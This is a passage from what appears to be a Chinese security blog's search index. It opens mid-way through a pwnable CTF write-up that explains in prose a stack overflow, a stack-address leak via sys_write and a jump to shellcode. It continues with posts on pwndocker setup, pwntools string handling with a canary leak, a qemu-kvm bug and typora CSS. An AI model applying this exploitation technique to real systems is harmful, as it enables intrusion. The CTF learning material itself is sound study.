src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211104215119020.png\" alt=\"image-20211104215119020\"></p>\n<p>​        按照我的想法，指令应该继续执行下去的，因为堆栈可执行。但是实际上并没有执行，而是把shellcode识别成了返回地址。</p>\n<p>​        然后我才意识到一直以来我对栈溢出其实是有一些理解上的错误的，retn这个操作码无论如何是不能够被覆盖的，覆盖的只有后面的操作数。所以这里我们需要让程序先retn到一个合法的地址，然后后面跟着shellcode。</p>\n<p>​        那么我们要retn到哪里呢？</p>\n<p>​        既然堆栈可执行，那就直接跳到栈上好了。所以此刻我们需要一个栈上的地址。</p>\n<p>​        既然需要泄露内存，肯定就需要有类似功能的函数，非常清明地，我们能够利用<code>sys_write</code></p>\n<p>对栈上内存进行一个读取。</p>\n<p>​        那么如何利用捏。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png\" alt=\"截屏2021-11-04 下午10.00.26\">            </p>\n<p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>\n<p>​        <code>mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>\n<p>​        </p>\n<p><img src=\"/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png\" alt=\"截屏2021-11-04 下午10.13.28\">        </p>\n<p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png\" alt=\"截屏2021-11-04 下午10.11.55\"></p>\n<p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>\n<p>​        这时候程序还是会按照原有的指令执行，比如说下一个<code>sys_read</code>函数。</p>\n<p>​        这时候并没有任何栈指针的操作，以至于esp的值很久没有变过。但是这里没有必要在意，直接第二次栈溢出。这里我们retn的地方就是刚刚获得的栈地址。但是因为我们已经输入了0x20个字符，所以需要stack_addr+20。（从动调中我们能够看出，<code>sys_read</code>会对栈指针进行操作，也就是把输入的每一个A压栈，这样我们原先的地址需要+20）</p>\n<p>​        然后直接溢出到栈地址。</p>\n<p>​        执行shellcode</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.23.43.png\" alt=\"截屏2021-11-04 下午10.23.18\"></p>\n<p>​            hhx</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.24.07.png\" alt=\"截屏2021-11-04 下午10.24.07\"></p>\n<h3><span id=\"4总结\">4）总结</span></h3><p>​        这道题以前做过。但是那个时候我还是个啥也不懂只会抄wp的傻子。那个时候基本问啥啥不懂，现在已经能完全通过exp将不理解的地方通过动调明确了。</p>\n<p>​        动调真的只用了不到半个小时，今天有五分之四的时间都在调教pwndocker的环境。用pwndocker来做真的非常优雅而且方便，我以后真的要舍弃pd力！！！！</p>\n<p>​        另外容器要记得及时备份55.</p>\n<p>​        还有就是经常出现挂载文件夹不同步的问题，这个应该是docker本身存在一些bug，重启以后基本能够解决。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["pwnable"]},{"title":"pwndocker的pwn题体验（下","url":"/2021/11/11/mess_pwndocker%E7%9A%84pwn%E9%A2%98%E4%BD%93%E9%AA%8C%EF%BC%88%E4%B8%8B%EF%BC%89/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-JtBJptiP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h3><span id=\"0\">0）</span></h3><p>​        哈哈，还是连续剧，我也想不到捏。我也不想捏。</p>\n<h3><span id=\"1问题\">1）问题</span></h3><p>​        pwndocker体验了快一周，目前来说主要问题有这几个：</p>\n<ol>\n<li><p>启动tmux进行调试时机器发热严重，风扇狂转</p>\n</li>\n<li><p>挂载文件夹内文件不同步</p>\n</li>\n<li><p>快照的制作相对麻烦（时间久，步骤多）</p>\n</li>\n<li><p>打开需要输入命令，有点烦。</p>\n<p>​    想了怪久的，就想到这三点，第三点纯属鸡蛋里挑骨头，主要pwndocker体验确实比较优雅，为了美观用vim编辑exp我都能忍。</p>\n<p>（看我的绝美终端）</p>\n</li>\n</ol>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8A%E5%8D%884.09.52.png\" alt=\"截屏2021-11-11 上午4.09.52\"></p>\n<p>​        每天在ayanami的注视下打工也会变得快乐（不是打工）</p>\n<p>​        虽然但是，这些问题感觉都不是什么好解决的问题，尤其机器发热。</p>\n<p>​        目前来说我只能应付。</p>\n<h3><span id=\"3解决方案\">3）解决方案？</span></h3><h4><span id=\"1\">1</span></h4><p>​        机器发热，cpu内存占用严重，这理论上是无解的，但是在使用过程中我发现这种情况并不是每次都会发生，而是概率性的，而且概率并不是特别高。所以目前敷衍的解决方案是，电脑一吵起来就关了tmux，等它安静了再开。</p>\n<p>​        2021-11-14更新：这个问题突然就没有了（</p>\n<h4><span id=\"2\">2</span></h4><p>​        挂载文件不同步，网上所有方案亲测无效。目前的解决方案是，不解决。用vim，或者出现问题就重启。</p>\n<p>​        2021-11-14更新：这个问题突然就没有了（</p>\n<h4><span id=\"3\">3</span></h4><p>​        这个可以整个一件push脚本</p>\n<p>ps：可以直接<code>docker commit -p</code> ，也算生成了快照，并且耗时比较短，就是有一点点没有安全感。</p>\n<h4><span id=\"4\">4</span></h4><p>​        直接写shell脚本，然后放在默认路径下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-11%20%E4%B8%8B%E5%8D%889.09.46.png\" alt=\"截屏2021-11-11 下午9.09.46\"></p>\n<h4><span id=\"5\">5</span></h4><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /glibc/2.27/64/lib/ld-2.27.so /tmp/ld-2.27.so</span><br><span class=\"line\">patchelf --set-interpreter /tmp/ld-2.27.so ./<span class=\"built_in\">test</span></span><br><span class=\"line\">LD_PRELOAD=./libc.so.6 ./<span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<p>好东西</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"pwn中的python字符串处理问题","url":"/2022/03/12/mess_pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-bVyTSXHN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>​        最近在pwncollege做题的时候常常遇到接收的字符串处理不当的问题，故总结整理一下。</p>\n<h3><span id=\"字符串截取\">字符串截取</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">p.recv()[<span class=\"number\">0</span>:<span class=\"number\">6</span>]\t\t<span class=\"comment\">#截取1-5个字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[<span class=\"number\">2</span>:<span class=\"number\">6</span>]\t\t<span class=\"comment\">#截取2-5个字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[:]\t\t<span class=\"comment\">#截取完整字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[<span class=\"number\">2</span>:]<span class=\"comment\">#从第二个索引开始截取</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()[-<span class=\"number\">4</span>:]<span class=\"comment\">#截取最后四个字符</span></span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<h3><span id=\"字符串处理\">字符串处理</span></h3><p>​        一般来说我们接收到的数据是字符串的字节流，然后利用pwntools的unpack  module来转换为int型。并且</p>\n<p>​        所以一般来说这样的payload是不会出问题的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">canary = u64(p.recv()[<span class=\"number\">41</span>:<span class=\"number\">49</span>])</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.04.36.png\" alt=\"截屏2022-03-12 上午11.04.36\"></p>\n<p>​        所以当接收到类似以下的报错：</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.07.11.png\" alt=\"截屏2022-03-12 上午11.07.11\"></p>\n<p>​        </p>\n<p>​        很大概率并不是数据类型转换的问题，而是本身接收的数据存在问题，比如说接收的数据范围错了，或者根本就没有有效的数据。这个时候关注的重点应该是payload的逻辑本身而不是语法问题。</p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"mess_qemu-kvm-KVM - entry failed, hardware error 0x7","url":"/2022/11/06/mess_qemu-kvm-KVM-%20entry%20failed,%20hardware%20error%200x7/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-ptCiWxBa\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<p>一个历史遗留问题，但是没有想到直接影响到俺恰米。</p>\n<p><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1016748\">https://bugzilla.redhat.com/show_bug.cgi?id=1016748</a></p>\n<p>目前并没有找到导致这个问题的元凶，之前搜索的时候发现这似乎是一个kvm在ubuntu某些特定版本下的历史遗留bug，所以可以通过更换ubuntu版本解决，亲测20.04 LTS是可行的。</p>\n<p>同时可以在qemu的启动参数上加上 cpu kvm64的参数。</p>\n","categories":["Binary_security"],"tags":["mess"]},{"title":"typora主题配置的一些心得","url":"/2021/10/29/mess_typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-JTodtrYf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> \n<h4><span id=\"1\">1）</span></h4><p>​    由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。</p>\n<h4><span id=\"2\">2）</span></h4><p>​    在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。</p>\n<p>​    这里以主题<code>mint</code>为例，css中<code>:root</code>元素声明了全局css变量，如下：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"selector-pseudo\">:root</span> &#123;</span><br><span class=\"line\">  --side-bar-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ffffff</span>;//边栏颜色</span><br><span class=\"line\">\t--control-text-<span class=\"attribute\">color</span>: <span class=\"number\">#6B6B6B</span>;//边栏文件未选中字体颜色</span><br><span class=\"line\">\t--active-file-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ecf6f2</span>;//边栏文件背景颜色</span><br><span class=\"line\">\t--active-file-<span class=\"attribute\">border-color</span>: <span class=\"number\">#6B6B6B</span>;//不清楚是个啥</span><br><span class=\"line\">\t--active-file-text-<span class=\"attribute\">color</span>: <span class=\"number\">#202020</span>;//边栏文件选中后字体颜色</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-even-row-<span class=\"attribute\">color</span>:<span class=\"number\">#f8fcfa</span>;//不清楚是个啥</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-head-<span class=\"attribute\">color</span>:<span class=\"number\">#d9ede5</span>;//不清楚是个啥</span><br><span class=\"line\">\t--deep-theme-<span class=\"attribute\">color</span>: <span class=\"number\">#c2e2d5</span>;//深色模式主题色</span><br><span class=\"line\">\t--<span class=\"selector-tag\">code</span>-block-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#0F111A</span>;//代码块字体颜色以及代码块边框颜色</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​    所以如果想修改各种配色，只需要修改对应颜色的hex就行。</p>\n<p>​    这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（</p>\n<p>​    然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用<code>highlight.js</code>（感觉也差不多233）。</p>\n<p>​    然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（</p>\n<p>​    (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢)</p>\n<p>​    其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-30%20%E4%B8%8B%E5%8D%882.46.50.png\" alt=\"截屏2021-10-30 下午2.46.50\"></p>\n<p>​        顺便附上它的css</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"selector-pseudo\">:root</span> &#123;</span><br><span class=\"line\">    --side-bar-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t--control-text-<span class=\"attribute\">color</span>: <span class=\"number\">#424242</span>;</span><br><span class=\"line\">\t--active-file-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t--active-file-<span class=\"attribute\">border-color</span>: <span class=\"number\">#6B6B6B</span>;</span><br><span class=\"line\">\t--active-file-text-<span class=\"attribute\">color</span>: <span class=\"number\">#7eadad</span>;</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-even-row-<span class=\"attribute\">color</span>:<span class=\"number\">#555555</span>;</span><br><span class=\"line\">\t--<span class=\"selector-tag\">table</span>-head-<span class=\"attribute\">color</span>:<span class=\"number\">#7a7979</span>;</span><br><span class=\"line\">\t--deep-theme-<span class=\"attribute\">color</span>: <span class=\"number\">#343a41</span>;</span><br><span class=\"line\">\t--<span class=\"selector-tag\">code</span>-block-bg-<span class=\"attribute\">color</span>: <span class=\"number\">#292424</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*serif*/</span></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/Lexend-Regular.ttf&#x27;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: bold;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/Lexend-Bold.ttf&#x27;</span>) </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*monospace*/</span></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;SourceCodePro&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">local</span>(SourceCodePro), <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/SourceCodePro-Regular.ttf&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*Chinese*/</span></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/NotoSansSC-Regular.otf&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@font-face</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-weight</span>: bold;</span><br><span class=\"line\">    <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">    <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">&#x27;./mint/NotoSansSC-Bold.otf&#x27;</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">html</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>,<span class=\"string\">&#x27;SourceCodePro&#x27;</span>,<span class=\"string\">&#x27;NotoSansSC&#x27;</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-weight</span>: normal;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>: <span class=\"number\">1.5rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">letter-spacing</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">max-width</span>: <span class=\"number\">900px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">30px</span> <span class=\"number\">50px</span> <span class=\"number\">20px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> <span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span><span class=\"selector-pseudo\">:left</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-id\">#write</span> pre<span class=\"selector-class\">.md-meta-block</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">1rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">85%</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">line-height</span>: <span class=\"number\">1.45</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>: <span class=\"number\">#ffffff</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-radius</span>: <span class=\"number\">3px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#141414</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">0</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.md-image</span>&gt;<span class=\"selector-class\">.md-meta</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#141414</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">0.9rem</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">font-family</span>: <span class=\"string\">&#x27;Lexend&#x27;</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">4px</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> print &#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">html</span>,<span class=\"selector-tag\">body</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">14px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-tag\">table</span>,</span><br><span class=\"line\">  pre &#123;</span><br><span class=\"line\">    <span class=\"attribute\">page-break-inside</span>: avoid;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  pre &#123;</span><br><span class=\"line\">    <span class=\"attribute\">word-wrap</span>: break-word;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">@page</span> &#123;</span><br><span class=\"line\">  size: A4; </span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">8mm</span> <span class=\"number\">0mm</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*toc*/</span></span><br><span class=\"line\"><span class=\"selector-class\">.md-toc</span> &#123; </span><br><span class=\"line\">    <span class=\"attribute\">margin-top</span>:<span class=\"number\">20px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding-bottom</span>:<span class=\"number\">20px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">a</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--deep-theme-color);</span><br><span class=\"line\">\t<span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: underline;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*headers*/</span></span><br><span class=\"line\"><span class=\"selector-tag\">h1</span>,<span class=\"selector-tag\">h2</span>,<span class=\"selector-tag\">h3</span>,<span class=\"selector-tag\">h4</span>,<span class=\"selector-tag\">h5</span>,<span class=\"selector-tag\">h6</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">\t<span class=\"attribute\">font-weight</span>:bold;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h1</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">2em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">0.67em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0.67em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h2</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1.5em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">0.83em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">0.83em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h3</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1.17em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h4</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h5</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#777777</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">h6</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">font-size</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-top</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin-bottom</span>: <span class=\"number\">1.33em</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">color</span>: <span class=\"number\">#adadad</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">p</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">blockquote</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">ol</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">dl</span>,</span><br><span class=\"line\"><span class=\"selector-tag\">table</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>: <span class=\"number\">0.8rem</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*table*/</span></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">border-collapse</span>: collapse;</span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">word-break</span>: initial;</span><br><span class=\"line\">\t<span class=\"attribute\">table-layout</span>: fixed;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">100%</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">tr</span><span class=\"selector-pseudo\">:nth-child</span>(even)&#123;</span><br><span class=\"line\">    